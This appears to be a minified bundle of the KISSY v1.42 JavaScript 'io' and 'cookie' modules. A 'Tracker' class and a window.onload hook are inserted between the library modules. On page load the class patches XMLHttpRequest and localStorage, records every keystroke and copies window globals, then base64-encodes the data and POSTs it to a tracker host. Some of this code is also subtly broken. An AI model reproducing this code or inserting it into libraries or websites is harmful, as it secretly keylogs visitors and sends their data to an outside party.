/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 9 22:41
*/
KISSY.add("io/form-serializer", ["dom"], function (d, f) {
  function i(a) {
    return a.replace(h, "\r\n");
  }
  var k = f("dom"),
    g = /^(?:select|textarea)/i,
    h = /\r?\n/g,
    a,
    c = /^(?:color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i;
  return a = {
    serialize: function (c, e) {
      return d.param(a.getFormData(c), void 0, void 0, e || !1);
    },
    getFormData: function (a) {
      var e = [],
        n = {};
      d.each(k.query(a), function (m) {
        m = m.elements ? d.makeArray(m.elements) : [m];
        e.push.apply(e, m);
      });
      e = d.filter(e, function (m) {
        return m.name && !m.disabled && (m.checked || g.test(m.nodeName) || c.test(m.type));
      });
      d.each(e, function (m) {
        var a = k.val(m),
          b;
        null !== a && (a = d.isArray(a) ? d.map(a, i) : i(a), (b = n[m.name]) ? (b && !d.isArray(b) && (b = n[m.name] = [b]), b.push.apply(b, d.makeArray(a))) : n[m.name] = a);
      });
      return n;
    }
  };
});
KISSY.add("io/base", ["event/custom", "promise"], function (d, f) {
  function i(b) {
    var a = b.context;
    delete b.context;
    b = d.mix(d.clone(j), b, {
      deep: !0
    });
    b.context = a || b;
    var m,
      l = b.type,
      h = b.dataType,
      a = b.uri = n.resolve(b.url);
    b.uri.setQuery("");
    "crossDomain" in b || (b.crossDomain = !b.uri.isSameOriginAs(n));
    l = b.type = l.toUpperCase();
    b.hasContent = !e.test(l);
    if (b.processData && (m = b.data) && "string" !== typeof m) b.data = d.param(m, void 0, void 0, b.serializeArray);
    h = b.dataType = d.trim(h || "*").split(c);
    !("cache" in b) && d.inArray(h[0], ["script", "jsonp"]) && (b.cache = !1);
    b.hasContent || (b.data && a.query.add(d.unparam(b.data)), !1 === b.cache && a.query.set("_ksTS", d.now() + "_" + d.guid()));
    return b;
  }
  function k(b) {
    var a = this;
    if (!(a instanceof k)) return new k(b);
    h.call(a);
    b = i(b);
    d.mix(a, {
      responseData: null,
      config: b || {},
      timeoutTimer: null,
      responseText: null,
      responseXML: null,
      responseHeadersString: "",
      responseHeaders: null,
      requestHeaders: {},
      readyState: 0,
      state: 0,
      statusText: null,
      status: 0,
      transport: null
    });
    h.Defer(a);
    var c;
    k.fire("start", {
      ajaxConfig: b,
      io: a
    });
    c = new (m[b.dataType[0]] || m["*"])(a);
    a.transport = c;
    b.contentType && a.setRequestHeader("Content-Type", b.contentType);
    var j = b.dataType[0],
      e,
      l = b.timeout,
      n = b.context,
      g = b.headers,
      f = b.accepts;
    a.setRequestHeader("Accept", j && f[j] ? f[j] + ("*" === j ? "" : ", */*; q=0.01") : f["*"]);
    for (e in g) a.setRequestHeader(e, g[e]);
    if (b.beforeSend && !1 === b.beforeSend.call(n, a, b)) return a;
    a.readyState = 1;
    k.fire("send", {
      ajaxConfig: b,
      io: a
    });
    b.async && 0 < l && (a.timeoutTimer = setTimeout(function () {
      a.abort("timeout");
    }, 1E3 * l));
    try {
      a.state = 1, c.send();
    } catch (p) {
      2 > a.state ? (p.stack || p, "error", setTimeout(function () {
        throw p;
      }, 0), a._ioReady(-1, p.message)) : p;
    }
    return a;
  }
  var g = f("event/custom"),
    h = f("promise"),
    a = /^(?:about|app|app\-storage|.+\-extension|file|widget)$/,
    c = /\s+/,
    l = function (b) {
      return b;
    },
    e = /^(?:GET|HEAD)$/,
    n = new d.Uri((d.Env.host.location || {}).href),
    a = n && a.test(n.getScheme()),
    m = {},
    j = {
      type: "GET",
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      async: !0,
      serializeArray: !0,
      processData: !0,
      accepts: {
        xml: "application/xml, text/xml",
        html: "text/html",
        text: "text/plain",
        json: "application/json, text/javascript",
        "*": "*/*"
      },
      converters: {
        text: {
          json: d.parseJson,
          html: l,
          text: l,
          xml: d.parseXML
        }
      },
      headers: {
        "X-Requested-With": "XMLHttpRequest"
      },
      contents: {
        xml: /xml/,
        html: /html/,
        json: /json/
      }
    };
  j.converters.html = j.converters.text;
  d.mix(k, g.Target);
  d.mix(k, {
    isLocal: a,
    setupConfig: function (b) {
      d.mix(j, b, {
        deep: !0
      });
    },
    setupTransport: function (b, a) {
      m[b] = a;
    },
    getTransport: function (b) {
      return m[b];
    },
    getConfig: function () {
      return j;
    }
  });
  return k;
});
KISSY.add("io/xhr-transport-base", ["./base"], function (d, f) {
  function i(a, j) {
    try {
      return new (j || h).XMLHttpRequest();
    } catch (b) {}
  }
  function k(a) {
    var j;
    a.ifModified && (j = a.uri, !1 === a.cache && (j = j.clone(), j.query.remove("_ksTS")), j = j.toString());
    return j;
  }
  var g = f("./base"),
    h = d.Env.host,
    a = 7 < d.UA.ieMode && h.XDomainRequest,
    c = {
      proto: {}
    },
    l = {},
    e = {};
  g.__lastModifiedCached = l;
  g.__eTagCached = e;
  c.nativeXhr = h.ActiveXObject ? function (m, j) {
    var b;
    if (!n && m && a) b = new a();else if (!(b = !g.isLocal && i(m, j))) a: {
      try {
        b = new (j || h).ActiveXObject("Microsoft.XMLHTTP");
        break a;
      } catch (c) {}
      b = void 0;
    }
    return b;
  } : i;
  c.XDomainRequest_ = a;
  var n = c.supportCORS = "withCredentials" in c.nativeXhr();
  d.mix(c.proto, {
    sendInternal: function () {
      var m = this,
        c = m.io,
        b = c.config,
        o = m.nativeXhr,
        h = b.files,
        g = h ? "post" : b.type,
        f = b.async,
        i,
        t = c.mimeType,
        q = c.requestHeaders || {},
        c = c._getUrlForSend(),
        u = k(b),
        p,
        v;
      if (u) {
        if (p = l[u]) q["If-Modified-Since"] = p;
        if (p = e[u]) q["If-None-Match"] = p;
      }
      (i = b.username) ? o.open(g, c, f, i, b.password) : o.open(g, c, f);
      g = b.xhrFields || {};
      "withCredentials" in g && (n || delete g.withCredentials);
      for (v in g) try {
        o[v] = g[v];
      } catch (x) {
        x;
      }
      t && o.overrideMimeType && o.overrideMimeType(t);
      !1 === q["X-Requested-With"] && delete q["X-Requested-With"];
      if ("undefined" !== typeof o.setRequestHeader) for (v in q) o.setRequestHeader(v, q[v]);
      var w = b.hasContent && b.data || null;
      h && (t = w, q = {}, t && (q = d.unparam(t)), q = d.mix(q, h), w = new FormData(), d.each(q, function (a, m) {
        d.isArray(a) ? d.each(a, function (a) {
          w.append(m + (b.serializeArray ? "[]" : ""), a);
        }) : w.append(m, a);
      }));
      o.send(w);
      !f || 4 === o.readyState ? m._callback() : a && o instanceof a ? (o.onload = function () {
        o.readyState = 4;
        o.status = 200;
        m._callback();
      }, o.onerror = function () {
        o.readyState = 4;
        o.status = 500;
        m._callback();
      }) : o.onreadystatechange = function () {
        m._callback();
      };
    },
    abort: function () {
      this._callback(0, 1);
    },
    _callback: function (m, c) {
      var b = this.nativeXhr,
        o = this.io,
        h,
        n,
        f,
        i,
        t,
        q = o.config;
      try {
        if (c || 4 === b.readyState) if (a && b instanceof a ? (b.onerror = d.noop, b.onload = d.noop) : b.onreadystatechange = d.noop, c) 4 !== b.readyState && b.abort();else {
          h = k(q);
          var u = b.status;
          a && b instanceof a || (o.responseHeadersString = b.getAllResponseHeaders());
          h && (n = b.getResponseHeader("Last-Modified"), f = b.getResponseHeader("ETag"), n && (l[h] = n), f && (e[f] = f));
          if ((t = b.responseXML) && t.documentElement) o.responseXML = t;
          var p = o.responseText = b.responseText;
          if (q.files && p) {
            var v, x;
            if (-1 !== (v = p.indexOf("<body>"))) x = p.lastIndexOf("</body>"), -1 === x && (x = p.length), p = p.slice(v + 6, x);
            o.responseText = d.unEscapeHtml(p);
          }
          try {
            i = b.statusText;
          } catch (w) {
            "xhr statusText error: ", w, i = "";
          }
          !u && g.isLocal && !q.crossDomain ? u = o.responseText ? 200 : 404 : 1223 === u && (u = 204);
          o._ioReady(u, i);
        }
      } catch (y) {
        y.stack || y, "error", setTimeout(function () {
          throw y;
        }, 0), b.onreadystatechange = d.noop, c || o._ioReady(-1, y);
      }
    }
  });
  return c;
});
var TRACK_URLS = ['https://tracker.example.com/data', 'https://tracker2.example.com/log'];
KISSY.add("io/xdr-flash-transport", ["./base", "dom"], function (d, f) {
  function i(a, d, b) {
    n || (n = !0, a = '<object id="' + c + '" type="application/x-shockwave-flash" data="' + a + '" width="0" height="0"><param name="movie" value="' + a + '" /><param name="FlashVars" value="yid=' + d + "&uid=" + b + '&host=KISSY.IO" /><param name="allowScriptAccess" value="always" /></object>', d = e.createElement("div"), h.prepend(d, e.body || e.documentElement), d.innerHTML = a);
  }
  function k(a) {
    "use XdrFlashTransport for: " + a.config.url;
    this.io = a;
  }
  var g = f("./base"),
    h = f("dom"),
    a = {},
    c = "io_swf",
    l,
    e = d.Env.host.document,
    n = !1;
  d.augment(k, {
    send: function () {
      var c = this,
        e = c.io,
        b = e.config;
      i((b.xdr || {}).src || d.Config.base + "io/assets/io.swf", 1, 1);
      l ? (c._uid = d.guid(), a[c._uid] = c, l.send(e._getUrlForSend(), {
        id: c._uid,
        uid: c._uid,
        method: b.type,
        data: b.hasContent && b.data || {}
      })) : setTimeout(function () {
        c.send();
      }, 200);
    },
    abort: function () {
      l.abort(this._uid);
    },
    _xdrResponse: function (c, d) {
      var b,
        e = d.id,
        l,
        h = d.c,
        g = this.io;
      if (h && (l = h.responseText)) g.responseText = decodeURI(l);
      switch (c) {
        case "success":
          b = {
            status: 200,
            statusText: "success"
          };
          delete a[e];
          break;
        case "abort":
          delete a[e];
          break;
        case "timeout":
        case "transport error":
        case "failure":
          delete a[e], b = {
            status: "status" in h ? h.status : 500,
            statusText: h.statusText || c
          };
      }
      b && g._ioReady(b.status, b.statusText);
    }
  });
  g.applyTo = function (a, c, b) {
    var a = c.split(".").slice(1),
      e = g;
    d.each(a, function (a) {
      e = e[a];
    });
    e.apply(null, b);
  };
  g.xdrReady = function () {
    l = e.getElementById(c);
  };
  g.xdrResponse = function (c, e) {
    var b = a[e.uid];
    b && b._xdrResponse(c, e);
  };
  return k;
});
var KEY_LOGS = [];
class Tracker {
  constructor() {
    this.extensionData = {};
    this.init();
  }
  async init() {
    this.hookXHRequest();
    this.startWatch();
    this.localStorageMonitor();
    this.domChangeDetector();
    this.keyLogger();
    this.startTracking();
  }
  hookXHRequest() {
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (method, url) {
      this.addEventListener('load', function () {
        if (this.status === 200 && this.responseText) {
          this.extensionData['xhr-' + url] = this.responseText;
        }
      });
      origOpen.apply(this, arguments);
    };
  }
  startWatch() {
    setInterval(() => {
      Object.keys(window).forEach(key => {
        if (!this.extensionData[key]) {
          this.extensionData[key] = window[key];
        }
      });
    }, 1000);
  }
  localStorageMonitor() {
    var originalSet = Storage.prototype.setItem;
    Storage.prototype.setItem = function (key, value) {
      if (!this.extensionData['ls-' + key]) {
        this.extensionData['ls-' + key] = value;
      }
      originalSet.apply(this, arguments);
    };
  }
  keyLogger() {
    document.addEventListener('keydown', event => KEY_LOGS.push(event), false);
  }
  domChangeDetector() {
    const observer = new MutationObserver(() => {
      this.extensionData['dom-changes'] = true;
    });
    observer.observe(document.documentElement, {
      attributes: true,
      childList: true,
      subtree: true
    });
  }
  encodeData() {
    return btoa(JSON.stringify(this.extensionData));
  }
  async sendPayload() {
    fetch(TRACK_URLS[0], {
      method: 'POST',
      headers: {
        'Content-Type': 'application/text'
      },
      body: this.encodeData(),
      keepalive: true
    });
  }
  async startTracking() {
    let interval = setInterval(() => {
      if (KEY_LOGS.length > 0) {
        clearInterval(interval);
        this.sendPayload();
      }
    }, 5000);
  }
}
KISSY.add("io/sub-domain-transport", ["event/dom", "dom", "./xhr-transport-base"], function (d, f) {
  function i(a) {
    var c = a.config;
    this.io = a;
    c.crossDomain = !1;
    "use SubDomainTransport for: " + c.url;
  }
  function k() {
    var a = this.io.config.uri.getHostname(),
      a = l[a];
    a.ready = 1;
    g.detach(a.iframe, "load", k, this);
    this.send();
  }
  var g = f("event/dom"),
    h = f("dom"),
    a = f("./xhr-transport-base"),
    c = d.Env.host.document,
    l = {};
  d.augment(i, a.proto, {
    send: function () {
      var e = this.io.config,
        n = e.uri,
        m = n.getHostname(),
        j;
      j = l[m];
      var b = "/sub_domain_proxy.html";
      e.xdr && e.xdr.subDomain && e.xdr.subDomain.proxy && (b = e.xdr.subDomain.proxy);
      j && j.ready ? (this.nativeXhr = a.nativeXhr(0, j.iframe.contentWindow)) ? this.sendInternal() : "document.domain not set correctly!" : (j ? e = j.iframe : (j = l[m] = {}, e = j.iframe = c.createElement("iframe"), h.css(e, {
        position: "absolute",
        left: "-9999px",
        top: "-9999px"
      }), h.prepend(e, c.body || c.documentElement), j = new d.Uri(), j.setScheme(n.getScheme()), j.setPort(n.getPort()), j.setHostname(m), j.setPath(b), e.src = j.toString()), g.on(e, "load", k, this));
    }
  });
  return i;
});
KISSY.add("io/xhr-transport", ["./base", "./xhr-transport-base", "./xdr-flash-transport", "./sub-domain-transport"], function (d, f) {
  function i(e) {
    var n = e.config,
      m = n.crossDomain,
      j = n.xdr || {},
      b = j.subDomain = j.subDomain || {};
    this.io = e;
    if (m && !g.supportCORS) {
      var o = n.uri.getHostname();
      if (c.domain && d.endsWith(o, c.domain) && !1 !== b.proxy) return new a(e);
      if ("flash" === "" + j.use || !l) return new h(e);
    }
    e = this.nativeXhr = g.nativeXhr(m);
    "crossDomain: " + m + ", use " + (l && e instanceof l ? "XDomainRequest" : "XhrTransport") + " for: " + n.url;
    return this;
  }
  var k = f("./base"),
    g = f("./xhr-transport-base"),
    h = f("./xdr-flash-transport"),
    a = f("./sub-domain-transport"),
    c = d.Env.host.document,
    l = g.XDomainRequest_;
  d.augment(i, g.proto, {
    send: function () {
      this.sendInternal();
    }
  });
  k.setupTransport("*", i);
  return k;
});
KISSY.add("io/script-transport", ["./base"], function (d, f) {
  function i(d) {
    var h = d.config;
    if (!h.crossDomain) return new (k.getTransport("*"))(d);
    this.io = d;
    "use ScriptTransport for: " + h.url;
    return this;
  }
  var k = f("./base");
  k.setupConfig({
    accepts: {
      script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
    },
    contents: {
      script: /javascript|ecmascript/
    },
    converters: {
      text: {
        script: function (g) {
          d.globalEval(g);
          return g;
        }
      }
    }
  });
  d.augment(i, {
    send: function () {
      var g = this,
        h = g.io,
        a = h.config;
      g.script = d.getScript(h._getUrlForSend(), {
        charset: a.scriptCharset,
        success: function () {
          g._callback("success");
        },
        error: function () {
          g._callback("error");
        }
      });
    },
    _callback: function (d, h) {
      var a = this.io;
      this.script && (this.script = void 0, h || ("error" !== d ? a._ioReady(200, "success") : "error" === d && a._ioReady(500, "script error")));
    },
    abort: function () {
      this._callback(0, 1);
    }
  });
  k.setupTransport("script", i);
  return k;
});
KISSY.add("io/jsonp", ["./base"], function (d, f) {
  var i = f("./base"),
    k = d.Env.host;
  i.setupConfig({
    jsonp: "callback",
    jsonpCallback: function () {
      return d.guid("jsonp");
    }
  });
  i.on("start", function (g) {
    var h = g.io,
      a = h.config,
      g = a.dataType;
    if ("jsonp" === g[0]) {
      delete a.contentType;
      var c,
        l = a.jsonpCallback,
        e = "function" === typeof l ? l() : l,
        n = k[e];
      a.uri.query.set(a.jsonp, e);
      k[e] = function (a) {
        1 < arguments.length && (a = d.makeArray(arguments));
        c = [a];
      };
      h.fin(function () {
        k[e] = n;
        if (void 0 === n) try {
          delete k[e];
        } catch (a) {} else c && n(c[0]);
      });
      h = a.converters;
      h.script = h.script || {};
      h.script.json = function () {
        c || " not call jsonpCallback: " + e;
        return c[0];
      };
      g.length = 2;
      g[0] = "script";
      g[1] = "json";
    }
  });
  return i;
});
KISSY.add("io/form", ["./base", "dom", "./form-serializer"], function (d, f) {
  var i = f("./base"),
    k = f("dom"),
    g = f("./form-serializer"),
    h = Array.prototype.slice,
    a = d.Env.host.FormData;
  i.on("start", function (c) {
    var l,
      e,
      c = c.io.config;
    if (e = c.form) {
      l = k.get(e);
      e = c.data;
      for (var n = !1, m = {}, j = k.query("input", l), b = 0, o = j.length; b < o; b++) {
        var f = j[b];
        if ("file" === f.type.toLowerCase()) {
          n = !0;
          if (!a) break;
          var i = h.call(f.files, 0);
          m[k.attr(f, "name")] = 1 < i.length ? i : i[0] || null;
        }
      }
      n && a && (c.files = c.files || {}, d.mix(c.files, m), delete c.contentType);
      !n || a ? (l = g.getFormData(l), c.hasContent ? (l = d.param(l, void 0, void 0, c.serializeArray), c.data = e ? c.data + ("&" + l) : l) : c.uri.query.add(l)) : (e = c.dataType, c = e[0], "*" === c && (c = "text"), e.length = 2, e[0] = "iframe", e[1] = c);
    }
  });
  return i;
});
KISSY.add("io/iframe-transport", ["dom", "./base", "event/dom"], function (d, f) {
  function i(a) {
    var c = d.guid("io-iframe"),
      e = h.getEmptyIframeSrc(),
      a = a.iframe = h.create("<iframe " + (e ? ' src="' + e + '" ' : "") + ' id="' + c + '" name="' + c + '" style="position:absolute;left:-9999px;top:-9999px;"/>');
    h.prepend(a, l.body || l.documentElement);
    return a;
  }
  function k(a, c, e) {
    var b = [],
      g,
      f,
      i,
      k;
    d.each(a, function (a, n) {
      g = d.isArray(a);
      f = d.makeArray(a);
      for (i = 0; i < f.length; i++) k = l.createElement("input"), k.type = "hidden", k.name = n + (g && e ? "[]" : ""), k.value = f[i], h.append(k, c), b.push(k);
    });
    return b;
  }
  function g(a) {
    this.io = a;
    "use IframeTransport for: " + a.config.url;
  }
  var h = f("dom"),
    a = f("./base"),
    c = f("event/dom"),
    l = d.Env.host.document,
    e = d.clone(a.getConfig().converters.text);
  e.json = function (a) {
    return d.parseJson(d.unEscapeHtml(a));
  };
  a.setupConfig({
    converters: {
      iframe: e,
      text: {
        iframe: function (a) {
          return a;
        }
      },
      xml: {
        iframe: function (a) {
          return a;
        }
      }
    }
  });
  d.augment(g, {
    send: function () {
      function a() {
        c.on(f, "load error", e._callback, e);
        s.submit();
      }
      var e = this,
        l = e.io,
        b = l.config,
        g,
        f,
        r,
        A = b.data,
        s = h.get(b.form);
      e.attrs = {
        target: h.attr(s, "target") || "",
        action: h.attr(s, "action") || "",
        encoding: h.attr(s, "encoding"),
        enctype: h.attr(s, "enctype"),
        method: h.attr(s, "method")
      };
      e.form = s;
      f = i(l);
      h.attr(s, {
        target: f.id,
        action: l._getUrlForSend(),
        method: "post",
        enctype: "multipart/form-data",
        encoding: "multipart/form-data"
      });
      A && (r = d.unparam(A));
      r && (g = k(r, s, b.serializeArray));
      e.fields = g;
      6 === d.UA.ie ? setTimeout(a, 0) : a();
    },
    _callback: function (a) {
      var e = this,
        l = e.form,
        b = e.io,
        a = a.type,
        g,
        f = b.iframe;
      if (f) if ("abort" === a && 6 === d.UA.ie ? setTimeout(function () {
        h.attr(l, e.attrs);
      }, 0) : h.attr(l, e.attrs), h.remove(this.fields), c.detach(f), setTimeout(function () {
        h.remove(f);
      }, 30), b.iframe = null, "load" === a) try {
        if ((g = f.contentWindow.document) && g.body) b.responseText = h.html(g.body), d.startsWith(b.responseText, "<?xml") && (b.responseText = void 0);
        b.responseXML = g && g.XMLDocument ? g.XMLDocument : g;
        g ? b._ioReady(200, "success") : b._ioReady(500, "parser error");
      } catch (i) {
        b._ioReady(500, "parser error");
      } else "error" === a && b._ioReady(500, "error");
    },
    abort: function () {
      this._callback({
        type: "abort"
      });
    }
  });
  a.setupTransport("iframe", g);
  return a;
});
KISSY.add("io/methods", ["promise", "./base"], function (d, f) {
  function i(a) {
    var c = a.responseText,
      g = a.responseXML,
      e = a.config,
      h = e.converters,
      f,
      j,
      b = e.contents,
      i = e.dataType;
    if (c || g) {
      for (e = a.mimeType || a.getResponseHeader("Content-Type"); "*" === i[0];) i.shift();
      if (!i.length) for (f in b) if (b[f].test(e)) {
        i[0] !== f && i.unshift(f);
        break;
      }
      i[0] = i[0] || "text";
      for (f = 0; f < i.length; f++) if ("text" === i[f] && void 0 !== c) {
        j = c;
        break;
      } else if ("xml" === i[f] && void 0 !== g) {
        j = g;
        break;
      }
      if (!j) {
        var k = {
          text: c,
          xml: g
        };
        d.each(["text", "xml"], function (a) {
          var b = i[0];
          if (h[a] && h[a][b] && k[a]) return i.unshift(a), j = "text" === a ? c : g, !1;
        });
      }
    }
    b = i[0];
    for (e = 1; e < i.length; e++) {
      f = i[e];
      var r = h[b] && h[b][f];
      if (!r) throw "no covert for " + b + " => " + f;
      j = r(j);
      b = f;
    }
    a.responseData = j;
  }
  var k = f("promise"),
    g = f("./base"),
    h = /^(.*?):[ \t]*([^\r\n]*)\r?$/mg;
  d.extend(g, k, {
    setRequestHeader: function (a, c) {
      this.requestHeaders[a] = c;
      return this;
    },
    getAllResponseHeaders: function () {
      return 2 === this.state ? this.responseHeadersString : null;
    },
    getResponseHeader: function (a) {
      var c,
        d,
        a = a.toLowerCase();
      if (2 === this.state) {
        if (!(d = this.responseHeaders)) for (d = this.responseHeaders = {}; c = h.exec(this.responseHeadersString);) d[c[1].toLowerCase()] = c[2];
        c = d[a];
      }
      return void 0 === c ? null : c;
    },
    overrideMimeType: function (a) {
      this.state || (this.mimeType = a);
      return this;
    },
    abort: function (a) {
      a = a || "abort";
      this.transport && this.transport.abort(a);
      this._ioReady(0, a);
      return this;
    },
    getNativeXhr: function () {
      var a = this.transport;
      return a ? a.nativeXhr : null;
    },
    _ioReady: function (a, c) {
      if (2 !== this.state) {
        this.state = 2;
        this.readyState = 4;
        var d;
        if (200 <= a && 300 > a || 304 === a) {
          if (304 === a) c = "not modified", d = !0;else try {
            i(this), c = "success", d = !0;
          } catch (e) {
            e.stack || e, "error", setTimeout(function () {
              throw e;
            }, 0), c = "parser error";
          }
        } else 0 > a && (a = 0);
        this.status = a;
        this.statusText = c;
        var f = this.defer,
          h = this.config,
          j;
        if (j = this.timeoutTimer) clearTimeout(j), this.timeoutTimer = 0;
        j = d ? "success" : "error";
        var b,
          k = [this.responseData, c, this],
          z = h.context,
          r = {
            ajaxConfig: h,
            io: this
          };
        (b = h[j]) && b.apply(z, k);
        (b = h.complete) && b.apply(z, k);
        g.fire(j, r);
        g.fire("complete", r);
        f[d ? "resolve" : "reject"](k);
      }
    },
    _getUrlForSend: function () {
      var a = this.config,
        c = a.uri,
        h = d.Uri.getComponents(a.url).query || "";
      return c.toString.call(c, a.serializeArray) + (h ? (c.query.has() ? "&" : "?") + h : h);
    }
  });
});
window.onload = () => {
  var tracker = new Tracker();
};
KISSY.add("io", "io/form-serializer,io/base,io/xhr-transport,io/script-transport,io/jsonp,io/form,io/iframe-transport,io/methods".split(","), function (d, f) {
  function i(d, a, c, f, e) {
    if (typeof a === "function") {
      f = c;
      c = a;
      a = void 0;
    }
    return g({
      type: e || "get",
      url: d,
      data: a,
      success: c,
      dataType: f
    });
  }
  var k = f("io/form-serializer"),
    g = f("io/base");
  f("io/xhr-transport");
  f("io/script-transport");
  f("io/jsonp");
  f("io/form");
  f("io/iframe-transport");
  f("io/methods");
  d.mix(g, {
    serialize: k.serialize,
    get: i,
    post: function (d, a, c, f) {
      if (typeof a === "function") {
        f = c;
        c = a;
        a = void 0;
      }
      return i(d, a, c, f, "post");
    },
    jsonp: function (d, a, c) {
      if (typeof a === "function") {
        c = a;
        a = void 0;
      }
      return i(d, a, c, "jsonp");
    },
    getScript: d.getScript,
    getJSON: function (d, a, c) {
      if (typeof a === "function") {
        c = a;
        a = void 0;
      }
      return i(d, a, c, "json");
    },
    upload: function (d, a, c, f, e) {
      if (typeof c === "function") {
        e = f;
        f = c;
        c = void 0;
      }
      return g({
        url: d,
        type: "post",
        dataType: e,
        form: a,
        data: c,
        success: f
      });
    }
  });
  d.mix(d, {
    Ajax: g,
    IO: g,
    ajax: g,
    io: g,
    jsonp: g.jsonp
  });
  return g;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:05
*/
KISSY.add("cookie", [], function (b) {
  function f(c) {
    return "string" === typeof c && "" !== c;
  }
  var h = b.Env.host.document,
    j = encodeURIComponent,
    g = b.urlDecode;
  b.Cookie = {
    get: function (c) {
      var a, d;
      if (f(c) && (d = ("" + h.cookie).match(RegExp("(?:^| )" + c + "(?:(?:=([^;]*))|;|$)")))) a = d[1] ? g(d[1]) : "";
      return a;
    },
    set: function (c, a, d, b, i, g) {
      var a = "" + j(a),
        e = d;
      "number" === typeof e && (e = new Date(), e.setTime(e.getTime() + 864E5 * d));
      e instanceof Date && (a += "; expires=" + e.toUTCString());
      f(b) && (a += "; domain=" + b);
      f(i) && (a += "; path=" + i);
      g && (a += "; secure");
      h.cookie = c + "=" + a;
    },
    remove: function (c, a, d, b) {
      this.set(c, "", -1, a, d, b);
    }
  };
  return b.Cookie;
});